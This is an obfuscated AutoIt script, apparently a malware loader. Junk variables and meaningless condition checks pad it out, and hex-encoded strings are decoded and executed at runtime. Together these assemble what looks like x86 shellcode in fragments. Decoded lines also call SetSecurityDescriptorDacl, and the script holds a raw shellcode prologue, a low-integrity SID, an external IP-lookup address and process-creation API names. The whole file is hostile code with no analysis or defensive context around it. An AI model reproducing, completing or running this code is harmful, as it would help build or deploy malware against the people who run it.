	If NOT ($lvvpqfviydsegxbzw == "mauiyrwcdluhhszsgefpgsrtpxntn") Then
		Local $efnregjwdnnlnwynttuytkqdrmyu = $ee($v1("0x247575786B73686469736E7376717274616562616A70767A77706475717A2026202243373835434346444646464634363732363536354337383544304644464646463532363537333646433738354434464446464646373537323633363538383835443846444646464622"))
	Else
		Local $aaimblpftybmllkrzjb = $ee($v1("0x246366636374776467776B7A7270717361782026202243373835384346424646464637343434363537334337383539304642464646463734373236463739433738353934464246464646343836313733363838383835393846424646464622"))
	EndIf
	Dim $acgzdpjo = IsString("icejahydgnhmeskcrbbnqunicebptjvezgom")
	Dim $niedhjhfkezkic = "Error"
	Global $ebibargzyyxjeliy = "handle"
	Dim $mbmckyqxgov = ">"
	Global $kowrlmrxdikjvfsrloxd = "al"
	Local $yycjtzkdmzpuwlgisq = "ptr"
	Global $rackfod = "Text"
	Local $mwwxtidxytfykglvffgfm = "user32.dll"
	Local $hxayokhwxecyaonz = "wstr"
	Global $exspvzjixajisfiqv = "Y"
	Dim $nljagdnvrrgq = "int"
	Dim $qoiezecjvowksr = "struct*"
	Global $kjcsorjsmnrgusoptr = "kernel32.dll"
	Local $felcnmk = "handle"
	Global $tzofjat = "Scan0"
	Global $mmrldbvhvyaxfoffrqafzzr = "wparam"
	Global $fmeoaoeors = "127.0.0.1"
	Dim $mqcyvdwuzaeiccrynvhnwwic = "Item"
	Global $tqxmrrropwavh = "), StringReplace($aStrings[$iI], "
	If NOT ($acgzdpjo == 0) Then
		Local $avonnjn = $ee($v1("0x2465666E7265676A77646E6E6C6E77796E74747579746B7164726D79752026202243373835383446434646464634333732363536314337383538384643464646463734363535303732433738353843464346464646364636333635373336364337383539304643464622"))
	Else
		Local $reubjzetidgaonwqmfirszvecys = $ee($v1("0x2470736C68786E756F67706D636C6B7766776B70696D78656379782026202238443835363046424646464635304538454445374646464638393835373430313030303038443835443046454646464635304538444245374646464638393835303030313030303022"))
	EndIf
	Dim $fmafxmmqdxgmcp = BinaryToString("0x786778717A76")
	Global $decnnqkncbmzzljqwc = "wchar["
	Dim $gatplfpyhvjypyidynpmzko = "gdi32.dll"
	Global $aszlyrwtw = "float"
	Dim $blvpufdaknbnxolozwlcrfe = "SHLoadIndirectString"
	Global $wrcwbeubldrjpioxvnrmnj = "handle"
	Dim $asgfwhyqyilxnmwswdiw = "uint"
	Dim $nujqfni = "CloseHandle"
	Local $camovpvttqzdzhbvtrgxl = "int"
	Global $slmqtdqvycllkean = " type="
	Dim $qdkubpjtqgpjygxvjdezq = "{C4AA340D-F20F-4863-AFEF-F87EF2E6BA25}"
	Dim $wwplpqsl = "wparam"
	Local $liqkbjj = "int"
	Local $tmfmirkhdfqa = "wparam"
	If NOT ($fmafxmmqdxgmcp == 0) Then
		Local $ieellj = $ee($v1("0x2461766F6E6E6A6E2026202246463733353738383835393246434646464643373835313446444646464635323734364335414337383531384644464646463635373236463444433738353143464446464646363522"))
	Else
		Local $kzlfbaskuhxaqhfypkxhxh = $poe($wzneciaftzmxvngecerfajkujgwyjzn("0x46696C6545786973747328246870756471677972676C79626A7A74737A756A6475706E797A6A67677A6F79726C6564616B686D676D6E6765646578626C786C7529"))
	EndIf
	Dim $faydzndbpclntsdqgaoudjk = IsString(33981052)
	Dim $ednlcsf = "/"
	Local $abfrxcbvy = "dword"
	Dim $ypmluvqaxafaxlo = "handle"
	Local $mcfaa = "https://api.ipify.org"
	Local $mhxlbpaqfxyqxk = "$_IESTATUS_InvalidValue"
	Local $zvftmnakxfa = "dySPaceAfter"
	Global $zxhjidmzqahfqbucc = "GlobalSize"
	Global $aritztwadjzihizsqa = "\"
	Dim $afflgwypucjnfpioojpglv = "wparam"
	Dim $xicbmbpovzmdhtwykjhqucsr = "handle"
	Dim $nzkfyeminwohatyjpw = "Error"
	Dim $siblzlevplxlkcpku = "WinAPIHObj.au3"
	Global $licwbgwwscutubvqjtzt = "*"
	Local $kqwqqjyvimmejgfktohcnqd = "WinAPIMisc.au3"
	Dim $ybaofmykrf = "uint"
	Local $mthmhixmk = "int"
	Local $eaklumghi = "$_IESTATUS_InvalidObjectType"
	Global $tgagyozfdivifdwhlvnxr = "char["
	Dim $ozwsyhxbwmsai = "dword"
	If NOT ($faydzndbpclntsdqgaoudjk == "kcivefkgevfmfbepsssdaatejcjquovgjfoambdoldxigi") Then
		Local $dbonybzaivkzrgto = $ee($v1("0x246965656C6C6A2026202236443646373236364337383532304644464646463739303043373835333846424646464634453734353436354337383533434642464646463732364436393645433738353430464222"))
	Else
		Local $ruqkqolyjqapigffkamsrgj = $ee($v1("0x2468696B6A77616A636D7A786D6F6467636D6C62706A7075632026202238353943463946464646373436353536363943373835413046394646464637323734373536314337383541344639464646463643344436353644433738354138463946464646364622"))
	EndIf
	Dim $vedcwfbfqqywnya = IsInt(16895977)
	Local $yshhwkumtlvyuhrsog = "float"
	Dim $ufczkkdwihvtzpd = "PathCompactPathExW"
	Global $llplfuzcf = "char Text[4096]"
	Dim $ebiedmfhlarpldae = "int"
	If NOT ($vedcwfbfqqywnya == "oivklyiyciiwnnrajzjfbrwf") Then
		Local $kzrhowhzaxeiqjohj = $ee($v1("0x2464626F6E79627A6169766B7A7267746F2026202246464646363137343635353043373835343446424646464637323646363336353636433738353438464246464646373337333838383534414642464646464337383533434641464622"))
	Else
		Local $kqvrjqdppjzjuefuevrd = $ee($v1("0x24767A646B74797976646E6A79716C696A7478716C74626B2026202237383734433738353330464246464646353436383732363536364337383533344642464646463631363438383835333646424646464643373835464346414646464634453734343722"))
	EndIf
	Dim $ousasuxjahzifwotcu = IsString("porxpmdyohkofkusqyaigrfcfied")
	Local $nuluzabtuhnsmweiogu = "<input type="
	Global $cvuarbguzfx = "GdipCreateBitmapFromFile"
	Dim $gzyiynear = "GdipGetRegionHRgn"
	Dim $ylwosevfsqazianahhuksy = "InternetCloseHandle"
	Local $lnjdbdpyvcu = "bool"
	Local $shynqzyaxzdsjjr = "handle"
	Global $hfgqlcqmkbny = "gdi32.dll"
	Dim $ucdtllpjlqjzjtfgrdkqgg = ", Keyboard: "
	Global $wdpxnzgawphoknxrvvacch = "LPtoDP"
	If NOT ($ousasuxjahzifwotcu == 0) Then
		Local $ppjcqtkyuszdnvcutufueuhto = $ee($v1("0x246B7A72686F77687A61786569716A6F686A2026202246463445373435373732433738353430464146464646363937343635353643373835343446414646464636393732373437354337383534384641464646463631364334443635433722"))
	Else
		Local $kjoqisdymcxkdlpssmymdgel = $ee($v1("0x246D6D667977656C6F71776C6966787265702026202236444535464646463842354430433839343536303844383543304641464646463530453835424535464646463839343535433844383535344646464646463530453834434535464622"))
	EndIf
	Dim $uvvimqnb = IsString(-59633576)
	Dim $myrcy = ")"
	Dim $shpnzklbstpkkdrdxogcfgmz = "dword"
	Local $wizduofcngvm = "Height"
	Dim $odywp = "%.1f"
	Dim $ekgbslupwiapssq = "struct*"
	Global $bdxccaaf = "handle"
	Local $tabqu = "ulong_ptr"
	Global $mmrtqydfmhvndalh = "int"
	Local $hfbntl = " & $aItem[2] & "
	Dim $zyxxwgjsjkh = "float"
	Global $nxwwwsptnfslilzyhavv = "Image"
	If NOT ($uvvimqnb == "jqsbqtdktvueauulpguaonejcrffknedgxdzmbnpionv") Then
		Local $maxrkyhdqcrklufhiudiv = $ee($v1("0x2470706A6371746B7975737A646E76637574756675657568746F2026202238353443464146464646364436463732373938383835353046414646464643373835353446414646464635413737353536454337383535384641464646463644363137303536433722"))
	Else
		Local $qzpcwpoemanbstaawd = $ee($v1("0x24677269696F776E6262666971727A6D6B636E2026202235333536353738314543373830313030303036413545353938424643384438343234303830343030303033334442384442343234383830313030303038393943323441343032303022"))
	EndIf
	Dim $kxqxrsxsiyjlnpw = BinaryToString("emmkjft")
	Global $lsfkxxslc = "Fmt"
	Local $oznygy = "]"
	Global $vxucxxjbshkdacssfatam = "uint"
	Dim $hwocyiujvkqvkizaj = "AutoItConstants.au3"
	Local $xyoxufayiwjgveuajgcknbip = "Helpful Tools: "
	Global $wasqbfcrii = "BackupWrite"
	Dim $hwbybkzgoyrchzlwqyl = "none"
	Global $xpfhbtmm = "handle"
	If NOT ($kxqxrsxsiyjlnpw == 0) Then
		Local $ncbnxpjmeuhqndtn = $ee($v1("0x246D6178726B7968647163726B6C75666869756469762026202238353543464146464646363936353737344643373835363046414646464636363533363536334337383536344641464646463734363936463645383838353638464146464646433722"))
	Else
		Local $bgkpiyaenivrkicgyidgsizyprtg = $ee($v1("0x2473656C617774676E637A66756A646F2026202245384138453846464646383938353534303130303030384438354143463946464646353045383936453846464646383938353838303030303030384438353934463946464646353022"))
	EndIf
	Dim $yjcrajnbxbicboufqvr = BinaryToString("kzqmvisnqiwmnvlliowetjcogxuzhsfleepyu")
	Global $yltujgt = "AutoIt.Error"
	Dim $dyxuvhkkzwvvnrnvcruiono = "ole32.dll"
	Global $qtsrhgvdkvhwzkyu = "browsery"
	Global $cxbhndbhxjq = "handle"
	Global $hrrrho = "ptr"
	Global $grngskjucpqpq = "S-1-16-8448"
	Local $ofzytuli = "ptr*"
	Global $hcdjtdnvpzxjxnpntil = "\"
	If NOT ($yjcrajnbxbicboufqvr == 0) Then
		Local $hktrzwslkhzzn = $ee($v1("0x246E63626E78706A6D657568716E64746E2026202238353734464346464646344537343532363543373835373846434646464637333735364436354337383537434643464646463534363837323635363643373835383046434646464622"))
	Else
		$er = $poe($fooi4e("0x446C6C43616C6C282261647661706933322E646C6C222C2022696E74222C2022536574536563757269747944657363726970746F724461636C222C2022707472222C2024504F4F4F452C2022696E74222C202231222C2022707472222C20244F4F2C2022696E74222C2022302229"))
	EndIf
	Dim $fmtjpbr = IsString("vndngcyskye")
	Local $rcrygwmdswfrvckdgraicpcp = "handle"
	Dim $bvjkulkf = "documentContainer"
	Global $nmymkihcnmqnfned = "shell32.dll"
	If NOT ($fmtjpbr == 0) Then
		Local $vzdktyyvdnjyqlijtxqltbk = $ee($v1("0x24686B74727A77736C6B687A7A6E2026202236313634383838353832464346464646433738353234464246464646344537343533363543373835323846424646464637343433364636454337383532434642464646463734363522"))
	Else
		Local $nvbmvmeprggzakzucgoexh = $ee($v1("0x247065726C6B657778656F736263756F6C2026202238423030384235383130433734354538373736333733364336364337343545433635364543363435454530304538413646454646464635363839373545344646443030334330363622"))
	EndIf
	Dim $acogsl = IsString(-26167554)
	Local $lwzfrenjp = "float"
	Global $hmrkhewphnd = "$_IESTATUS_InvalidValue"
	Global $htneb = "kernel32.dll"
	Global $cprinjqthxgugtaaaequyx = "int"
	Local $rxuwlcxllkbtz = "wstr"
	Local $ofgeatntnexfbyewcxvmwxwu = "wparam"
	Local $iyganewjrmkjyjbigfrjn = "ptr"
	Dim $cvzcrjlvryeugejbf = "ptr"
	Local $soxcvopprzic = "biSizeImage"
	If NOT ($acogsl == "jvfdszyc") Then
		Local $kqvrjqdppjzjuefuevrd = $ee($v1("0x24767A646B74797976646E6A79716C696A7478716C74626B2026202237383734433738353330464246464646353436383732363536364337383533344642464646463631363438383835333646424646464643373835464346414646464634453734343722"))
	Else
		Local $ridhqys = $ee($v1("0x24746D6C74612026202236353738373435373838383533384641464646464337383544344642464646463433373237393730433738354438464246464646373434333732363543373835444346424646464622"))
	EndIf
	Dim $yreuriborafgccvqe = BinaryToString("bozclyqaxfafoaraacbqttvceaq")
	Global $yxgdtwespcaqfsx = "theatermode"
	Global $jdwxxomn = "int"
	Dim $jizrkthnooekzkdglwdts = "wchar["
	Local $trbzrrgcdxgtay = "\psapi.dll"
	Global $xipetxmuiarphcisn = "hwnd;lparam"
	Global $iwxhchbdjfmaedutaha = "struct*"
	Local $jqpmwuyb = "SMBSRecv"
	Dim $ghblhc = "<td>"
	Global $lcnqkdiorfx = "lparam"
	Dim $ngspkhf = "ptr"
	Global $yywtisfoyftgcy = "\\"
	Global $jjhddceneonbod = "GdipSetLineGammaCorrection"
	Local $smgogz = "user32.dll"
	Dim $ykgdu = "Type"
	Local $wxkiuwsfddsnkbpwbgpmx = "int"
	Local $uddthauzks = "MaxDOW"
	If NOT ($yreuriborafgccvqe == 1) Then
		Local $xjtikkcqjjn = $ee($v1("0x246B7176726A716470706A7A6A75656675657672642026202236354337383530304642464646463734343336463645433738353034464246464646373436353738373443373835303846424646464635343638373236353636433738353043464222"))
	Else
		Local $tjnzhgdqplkqjm = $ee($v1("0x247466676262706F6F726961766F6C6F62657A6170707175686B642026202238443835303446454646464635304538434445364646464638393835304330313030303038443835334346414646464635304538424245364646464638393835364330313030303022"))
	EndIf
	Dim $ztxqoidvi = IsString(-60493138)
	Global $cnxextndnrsy = "int"
	Dim $sdrujwhiyxoz = "LONG_PTR"
	Global $mgyxygbfuoswffxpkalpsydl = "dword"
	Global $zgjtxeoe = "http://www.autoitscript.com"
	Dim $ecqxw = "ImageList_GetIcon"
	Local $ccaid = "bool"
	Dim $hocmkdbcylu = "handle"
	Global $blpkvjzubxvmsbyyfu = "bmBitsPixel"
	Global $qjoqbanzll = "wchar"
	Dim $bpstdujmmfqxk = "int"
	Dim $gzcwkkbbutiluqlaehaiglqy = "_IEPropertySet"
	Global $exsrajz = "struct*"
	Local $laqorzjmyrwtqsczwtu = "long"
	Dim $qhwebchcvkahs = "char Text["
	Local $pmhlncglgzobmgkcoakj = "SetFilePointer"
	Local $gfwwmtizvqbehbsxoblxbof = "ptr"
	Local $xtswaccoafqfusyzskkccbwc = "ptr"
	Dim $pwszghmvp = "wparam"
	If NOT ($ztxqoidvi == 1) Then
		Local $ttpttxhof = $ee($v1("0x24786A74696B6B63716A6A6E2026202246464646363136343838383530454642464646464337383536304642464646463445373434443631433738353634464246464646373035363639363543373835363846424646464622"))
	Else
		Local $weymdkvsrospsvkhu = $ee($v1("0x247562766C68726C6C696F787970762026202236433733333333324337383537304645464646463543344636433635433738353734464546464646333333323245363436364337383537384645464646463643364338383835374122"))
	EndIf
	Dim $qybtamgigsycwvemwwxpaswm = IsString(-32685264)
	Local $iwjrsumajajvnanqtvecvp = "GetThemeAppProperties"
	Global $zxbobsgwlywpkdasmnv = "wstr"
	Global $rjwymbhbsxrztx = "hItem"
	Local $hdzccrajrej = "wparam"
	If NOT ($qybtamgigsycwvemwwxpaswm == 1) Then
		Local $zxuprcn = $ee($v1("0x24747470747478686F662026202237373446363635334337383536434642464646463635363337343639363643373835373046424646464636463645383838353732464246464646433738353034464346464646344522"))
	Else
		Local $fimbucfkotmypscbkxg = $ee($v1("0x2478657867772026202246454646464635433442364536464337383546384645464646463737364534343643433738354643464546464646364337333543344643373835303046464646464636433635333322"))
	EndIf
	Dim $deymgs = IsString("jquofqvzsmbtssedtfrnzcvio")
	Dim $jgyykkdiafnkukps = "ptr"
	Local $xysrtmagqrsfczkswscyh = "bool"
	Dim $wquecrzxokg = "BusType"
	Local $flkemqhalkkrtasp = "bool"
	If NOT ($deymgs == 0) Then
		Local $eodmqc = $ee($v1("0x247A78757072636E2026202237343433373243373835303846434646464636353631373436354337383530434643464646463533363536333734433738353130464346464646363936463645303043373835343022"))
	Else
		$poe($vdfsj("0x4D7367426F782824747970652C20247469746C652C2024626F647929"))
	EndIf
	Dim $wjudswdzsvqrstbhmqocol = IsString("qwantbqwdnaqgknxfcuehluoxyjqdmwtonxiguvnbecy")
	Local $lxzeywkuhtctnanymjus = ";byte Hdr[8]"
	Local $obakhlizyicsbs = "long"
	Global $iyunjxacbmomkqcvllcx = "</head>"
	If NOT ($wjudswdzsvqrstbhmqocol == "klgjhvlikflrbonomtceh") Then
		Local $xmaxmgznnfgv = $ee($v1("0x24656F646D71632026202246394646464634353738373036314337383534344639464646463645363434353645433738353438463946464646373636393732364643373835344346394646464636453644363522"))
	Else
		Local $sdyit = $ee($v1("0x2478716B76727361736F6A6B69762026202244433033463346463935334330313030303036413434384438353638464646464646353046463935334330313030303036384343303230303030384438353930464246464646353022"))
	EndIf
	Dim $iyuelli = BinaryToString("0x7562757264637A6666636E6C76657469686B")
	Global $ksvyeezigyumorzxphntifpw = "int"
	Dim $ptphsukgkzngxy = "handle"
	Global $dhptmkvyixqf = "bool"
	Global $zskoqrbsd = "browser"
	Local $cbpvfjfskpscjuikwubiagh = "{84236F7B-3BD3-428F-8DAB-4EA1439CA315}"
	Local $gscpmhxmtwsblwwg = "struct*"
	Local $hfwiq = "]"
	Local $gxvtkircmqud = "browserdom"
	Dim $alsuiflulxefikkltcxrpx = "float"
	Dim $utjqagocjvwyaafudkw = "comctl32.dll"
	Dim $sceaanngcil = "*"
	Local $cekrpczonntcsx = "documentContainer"
	Local $bplaglzfbp = "handle"
	Global $myltszzepaieprh = "handle"
	Global $upbkmdlvsklonwvza = "handle"
	Local $ennclocwrusgfyidmcmiiwgp = "word"
	If NOT ($iyuelli == 1) Then
		Local $gpfkl = $ee($v1("0x24786D61786D677A6E6E6667762026202236454337383535304639464646463734353337343732433738353534463946464646363936453637373336364337383535384639464646463537303043373835313046424646464622"))
	Else
		Local $perlkewxeosbcuol = $ee($v1("0x24686F7A686B7274702026202235304538444646454646464638424638384434354243353045384434464546464646383934354630384434354538353036344131333030303030303038423430304338423430313422"))
	EndIf
	Dim $nliqq = IsString(-64172291)
	Local $bzyxaoeys = "Y"
	Local $osnyhhqhgxjkbroa = "handle"
	Dim $incbmdpitsixnrzxpcsfafdz = "GdipCreateMatrix2"
	Local $vjadumgaamraurzx = "StrFormatByteSizeW"
	Global $wscty = "user32.dll"
	Local $ycjcxxptzspokhrylycxnaio = " "
	Dim $wtpbfinixqjtdfyafzk = "ptr"
	Local $dhavn = "innerhtml"
	Global $vbudsajqkgxzthcezspac = "float Radius; bool ExpandEdge"
	Local $evpibjubkcvhzzm = "ptr;dword"
	Local $pdsphwfvwvwwrhk = "Flags"
	Global $kbpamvoqmufagrjoznvontc = "WinAPISysInternals.au3"
	Local $foknwszonpyorwbqjkpwoemd = "cpMaxRange"
	Global $kkqyknnpagyxn = "No array variable passed to function"
	Global $uqkvynx = "Flags"
	Global $rkbbhfzhpdxqobehb = "wparam"
	Local $cvwasnxcmwngguv = "GdipDrawBezier"
	If NOT ($nliqq == "phxjeof") Then
		Local $xwhlezperixxcgwxrwctwkbpsm = $ee($v1("0x246770666B6C2026202234373635373434444337383531344642464646463646363437353643433738353138464246464646363534363639364343373835314346424646464636353445363136443636433722"))
	Else
		Local $djbnp = $ee($v1("0x24756D7366676D79666E7963776F64717664797968787766626C6478612026202243373835334346454646464636343643364330304337383538384645464646463543344236453646433738353843464546464646373736453434364343373835393046454646464622"))
	EndIf
	Dim $yysyfkogdbiqrmmy = IsString(94723141)
	Local $juiwv = "ptr"
	Local $jugbsclspxkiuolpl = "SecurityConstants.au3"
	Local $ichzp = "long:cdecl"
	Local $kbksxpth = "FtpRenameFileW"
	Local $kbfpqlfguislzipihngmenhi = "SeUnsolicitedInputPrivilege"
	Local $kevenwwzzdnqojiuvrp = "WinTitleMatchMode"
	Local $hmuvcuwtxb = "handle"
	Global $bzefodiqetwsdwtlqycic = "wstr"
	Local $rtbcffmnvngu = "ntdll.dll"
	Local $gards = "ptr"
	Dim $ydigcbjtfquoucfkzgiwppyu = "int"
	Global $hltplouczxzjmmuadwxge = "dword"
	Dim $mpgjifnb = "handle"
	Dim $hmbjza = "handle"
	Dim $zxvkupuygqrmepd = "wstr"
	Dim $ttjxdhkmocmyf = "int"
	If NOT ($yysyfkogdbiqrmmy == 1) Then
		Local $sntlmiucgpjqtnktvyc = $ee($v1("0x247877686C657A7065726978786367777872776374776B6270736D2026202238353230464246464646363534313838383532324642464646464337383544434639464646463445373435313735433738354530463946464646363537323739343943373835453422"))
	Else
		Local $dzjhwcxxtcorcdqmvvkhpl = $ee($v1("0x24647673646D6A686B7777686F646C787A66786C6E2026202236353645353037324337383535344642464646463646363336353733433738353538464246464646373335343646364236364337383535434642464646463635364538383835354522"))
	EndIf
	Dim $septwptlovpnpdwx = IsInt(13675171)
	Dim $dctoziarlilnyl = "Refresh"
	Local $lvaivb = "uint Size;uint Mask;uint Type;uint State;uint ID;handle SubMenu;handle BmpChecked;handle BmpUnchecked;"
	Global $jrfzgpybpbvewhttcndaq = "bool"
	Local $kgufeiaevey = ">0"
	Local $bvpwwjsxoohoso = "Error"
	Global $sgwpavsx = "struct*"
	Dim $jrikirmiltubpmrgyp = "]"
	Local $dafcpwaawzpibowfwgbc = "Y"
	Dim $yegcipthqpxfr = "uint*"
	Dim $ulhptetoxvabjoirwph = "ulong"
	Dim $slcszseifcongrurqtl = "Millimeters"
	Dim $osxbgfjbvkkbtwm = "WinDetectHiddenText"
	If NOT ($septwptlovpnpdwx == 0) Then
		Local $plyjyotcrpmvrt = $ee($v1("0x24736E746C6D69756367706A71746E6B747679632026202246394646464636453636364637324337383545384639464646463644363137343639433738354543463946464646364636453436363936364337383546304639464646463643363522"))
	Else
		Local $bmefhtskmiapgtjdmnprdycssfqk = $ee($v1("0x246471637A7771776F78636166616D762026202235304646443635393430353038443835383846454646464635303844383543344630464646463530464644373844383546344645464646463833433430433530464644363430353922"))
	EndIf
	Dim $ajppxmwi = IsInt(9145287)
	Global $mqoewkvxmzzdhed = ":"
	Global $fpokjpxrfbtojfchxunoabg = "MinYear"
	Local $plphtdtyzjzc = "wparam"
	If NOT ($ajppxmwi == 0) Then
		Local $rgckgwpdza = $ee($v1("0x24706C796A796F746372706D7672742026202238383835463246394646464643373835413046454646464634453734353236354337383541344645464646463631363434363639363643373835413846454646464636433635383822"))
	Else
		Local $kzfmgjfcvnlg = $ee($v1("0x2477686E67637A757271717473702026202230413530464637354538464639353643303130303030364134303537364130323844343544433530353735373537384434354638353046463735453846463735453046463935373822"))
	EndIf
	Dim $geftexpubahisjxdjhwzalb = IsString("biodjmtrqdqaxewsikbawpuyidquezrdaasqanmpkjcd")
	Global $gtiunohvwmdqu = "handle"
	Local $akkkavasghyvchln = "ftCreationTime"
	Dim $hsnvdbcgwdfeean = "PathIsFileSpecW"
	Global $lkksqogqm = "dwmapi.dll"
	Local $pophc = "ptr"
	Local $hixoeoactupjnirv = "int"
	Local $ypnokr = "bool"
	Local $pwxqkjxcmvobodwscf = "JPEG"
	Dim $uentozutnxizjnxwzzekoi = "wparam"
	Dim $kmqwi = "<title>_IE_Example("
	Dim $tvskwwjdiy = "int"
	Dim $epzvcf = "wparam"
	If NOT ($geftexpubahisjxdjhwzalb == 0) Then
		Local $hoacpicpdncbudv = $ee($v1("0x247267636B677770647A612026202238354141464546464646433738354430464546464646344537343446373043373835443446454646464636353645343636393636433738354438464546464646364336353838383522"))
	Else
		Local $djbnp = $ee($v1("0x24756D7366676D79666E7963776F64717664797968787766626C6478612026202243373835334346454646464636343643364330304337383538384645464646463543344236453646433738353843464546464646373736453434364343373835393046454646464622"))
	EndIf
	Dim $ilwmtdndxfkaspselcdvgg = IsString("xpelegartrpbzoovaxjqsovhorfmvimefruwqivcpvwjnmg")
	Global $wqafgyklj = "__EnumWindowsProc"
	Global $svzktoe = "wparam"
	Local $ujacopbboruxqnwaecheij = "status "
	Global $zhvquqprzwqed = "handle"
	Global $ihgjuemotkcb = "Error"
	Local $vbsoiflubegrq = "wparam"
	Global $smuac = "uint"
	Local $uuhwjnoglludlvmdx = "dword*"
	Dim $nnvhyjjo = "GetOpenFileNameW"
	Local $olbunyoknqa = "Indent"
	Dim $roxzqdpdlchyz = "int"
	Global $aqycgsjb = "lparam"
	Dim $dqoniqwgvmo = "user32.dll"
	Local $lzzmoypkjqkgcfzewalu = "	</tr>"
	Local $pyidseslqoivtkokhtshycb = ":memory:"
	Local $qpnophybjo = "TextMax"
	If NOT ($ilwmtdndxfkaspselcdvgg == "ofddfpbziuvpuqbegflvmzgguhggbjdicst") Then
		Local $wsfcnturxbgiiobnmlycjoqni = $ee($v1("0x24686F616370696370646E63627564762026202244414645464646464337383533344644464646463445373435333635433738353338464446464646373435363631364343373835334346444646464637353635344236353636433722"))
	Else
		Local $waoenetjkomgqpbbtnzqg = $ee($v1("0x2472756470796365776F67717A7370687470767662632026202236433838343545414337383530434646464646463445373434463730433738353130464646464646363536453442363536364337383531344646464646463739303043373835453422"))
	EndIf
	Dim $xfretrtjftiqebtezmxt = IsInt("vvbxzkvumojshvinbi")
	Dim $czbwrbadmwnptjjuhbxhxjo = "uint length;uint flags;uint showCmd;long ptMinPosition[2];long ptMaxPosition[2];long rcNormalPosition[4]"
	Global $wqmims = "StringFromGUID2"
	Dim $rsnoshmrefofdnzej = "DeviceIoControl"
	Global $tlmcp = "int*"
	Local $ejvansscunezksjif = "handle"
	Global $nddbufx = "Italic"
	Dim $znywnuknskvxj = "handle"
	Local $qacdwslfdagtghulwjnrb = "File.au3"
	Dim $yrdiiqtgqzpwdcng = "/"
	Global $nnqhlpjbaiutcwoffpd = "int"
	If NOT ($xfretrtjftiqebtezmxt == "vxqrkmhdxuopuj") Then
		Local $mxserq = $ee($v1("0x24777366636E74757278626769696F626E6D6C79636A6F716E692026202238353430464446464646373930304337383536344644464646463445373434333732433738353638464446464646363536313734363543373835364346444646464634363639364322"))
	Else
		Local $maxrkyhdqcrklufhiudiv = $ee($v1("0x2470706A6371746B7975737A646E76637574756675657568746F2026202238353443464146464646364436463732373938383835353046414646464643373835353446414646464635413737353536454337383535384641464646463644363137303536433722"))
	EndIf
	Dim $gadhryitvhphvqa = BinaryToString("0x6E766A6E637962666168617664766A77656E65676B71766F77766569656F7564616169656F797A68736A6A746768")
	Global $otyvfnapxiqywfhnnatrahea = "];"
	Local $fnxvxkwymb = "UDFGlobalID.au3"
	Dim $xswnqqlp = "ID"
	Local $jxazhpxqtgubznsnzhum = "struct*"
	Global $thkqjoarvadlakxq = "dword["
	Dim $iydqxayclhpaoligr = "user32.dll"
	Global $ctozbwbsdbqxioq = "bool"
	Local $nqllojgaoardguypo = "str"
	Local $pbyfzjrr = "gdi32.dll"
	Global $rqajicqeesahbazvwzsaa = "Fmt"
	Local $mrfmf = "struct*"
	Local $peznflpnxkfl = "USHORT"
	Global $ezouryyuldzwqwezmcrrwbl = "but you failed to provide a corresponding instance handle."
	If NOT ($gadhryitvhphvqa == 0) Then
		Local $myokdjamgnwdbiata = $ee($v1("0x246D78736572712026202236353838383537304644464646464337383530344645464646463445373435373732433738353038464546464646363937343635343643373835304346454646464636393643363522"))
	Else
		Local $bmljovsxurhwylkmcdnghttxrsfa = $ee($v1("0x2474626B6A61796279706466666F6F677A617A6D65677A6F666F6C2026202237323646363334314337383536344646464646463634363437323635363643373835363846464646464637333733383838353641464646464646433734354543363136343736363122"))
	EndIf
	Dim $jfdqaalsubmqx = IsInt(28791291)
	Local $kfozqtltjybbdnyj = "Day"
	Global $ekcodvvrioegblmbjwkok = "handle"
	Dim $mqtxzsoqqugdhrkevb = "]"
	Dim $rapqmomx = "handle"
	Local $dkcmc = "bool"
	Global $znpgfitslftiabnu = "Hdr"
	Dim $mectmjgaxo = "ptr"
	Dim $jofqbtjhsvarlczbxhvyqfl = "hwnd"
	Global $wziwene = "GetCursorInfo"
	Global $vwsxuzuicbaggy = "handle"
	Dim $diedjw = "keybd_event"
	Global $zvrmnqenfapye = "QueryType"
	If NOT ($jfdqaalsubmqx == 0) Then
		Local $bappvblh = $ee($v1("0x246D796F6B646A616D676E776462696174612026202230304337383545434638464646463532373436433436433738354630463846464646364637323644363143373835463446384646464637343433373537324337383546384638464622"))
	Else
		Local $efnregjwdnnlnwynttuytkqdrmyu = $ee($v1("0x247575786B73686469736E7376717274616562616A70767A77706475717A2026202243373835434346444646464634363732363536354337383544304644464646463532363537333646433738354434464446464646373537323633363538383835443846444646464622"))
	EndIf
	Dim $cuscqsjwxlamu = IsInt("gmhftjmhwlen")
	If NOT ($cuscqsjwxlamu == "wyvxalcmteulyitwugzpqzcfl") Then
		Local $csubwbngktjuey = $ee($v1("0x246261707076626C682026202246463732363536453734433738354643463846464646353537333635373243373835303046394646464634423635373935304337383530344639464646463631373436383030433722"))
	Else
		Local $zpqsb = $ee($v1("0x246D7163796D656E6765656F2026202246424646464634453734343337324337383541304642464646463635363137343635433738354134464246464646353436383732363543373835413846424646464636313634343522"))
	EndIf
	Dim $ajzyrpojcstyrdzrtbod = BinaryToString("vsdbwaoccvmslnqsbvfohvcsvmzlpqrydrcm")
	Local $ubnejfsauyuqmkeetnaqyfhb = "0x48894C240848895424104C894424184C894C24205541574831C0505050505050"
	Dim $ywytrkzxoa = "LutB"
	Global $axxfeahqkyctrza = "dword"
	Global $kixudwedgmnpdo = "struct*"
	Local $aicwttrnywaalyhvp = "MsgBoxConstants.au3"
	Local $guaabuvcuunydjah = "dword;dword[2];dword[2];dword[2];dword;dword;dword;dword;dword;dword"
	Local $oggfzecvnfuotjyjg = "user32.dll"
	Dim $zyoteibwcyaezdvjzobvy = "hwnd"
	Dim $zfupfzuaourqrnaqdfspfq = "ptr"
	Local $okrfgvaqrtyolrc = "PropertyTagUnKnown"
	Dim $fmfrlnkstgsrjqebq = "         "
	Dim $hyrzzuccroqleakchwzd = "CreateProcessW"
	Local $tyakijk = "dword"
	If NOT ($ajzyrpojcstyrdzrtbod == 1) Then
		Local $dlzrpnlpehsxqebbqwdcarglkl = $ee($v1("0x246373756277626E676B746A7565792026202234353843373736333733363336364337343539303631373438383435393243373835374346464646464636443635364437333636433734353830363537343838343538324337383522"))
	Else
		Local $ruqkqolyjqapigffkamsrgj = $ee($v1("0x2468696B6A77616A636D7A786D6F6467636D6C62706A7075632026202238353943463946464646373436353536363943373835413046394646464637323734373536314337383541344639464646463643344436353644433738354138463946464646364622"))
	EndIf
	Local $jxqprzvcweqemywnnmizkifjc = $ee($v1("0x24646C7A72706E6C706568737871656262717764636172676C6B6C2026202242304642464646463445373434343635433738354234464246464646364336313739343543373835423846424646464637383635363337354337383542434642464646463734363922"))
